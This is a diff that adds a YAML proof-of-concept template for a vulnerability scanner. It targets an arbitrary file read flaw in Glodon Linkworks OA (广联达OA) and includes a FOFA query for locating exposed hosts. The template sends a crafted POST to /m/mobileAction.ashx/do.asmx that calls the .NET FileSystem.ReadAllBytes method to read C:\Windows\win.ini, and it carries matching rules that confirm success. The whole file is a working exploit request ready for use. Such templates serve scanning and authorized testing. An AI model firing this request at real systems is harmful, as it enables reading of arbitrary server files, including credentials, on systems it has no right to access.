@@ -1,0 +1,19 @@
+id: poc-yaml-glodon-do-asmx-anyfile-read
+info:
+  name: 广联达OA do.asmx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: 广联达 Linkworks办公OA
+  fofa: header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+requests:
+- method: POST
+  path: /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=ReadAllBytes
+  headers:
+    Content-Type: application/json
+  data: '["\"C:\\\\Windows\\\\win.ini\""]'
+  expression: status_code == 200 && contains(body,"\"IsSuccess\":true") && contains(body,"\"StatusCode\":\"OK\"")
+    && !contains(body,"未能找到文件") && matches(body,`"Data":[[0-9,]+]`)
+variables: {}
+transport: http
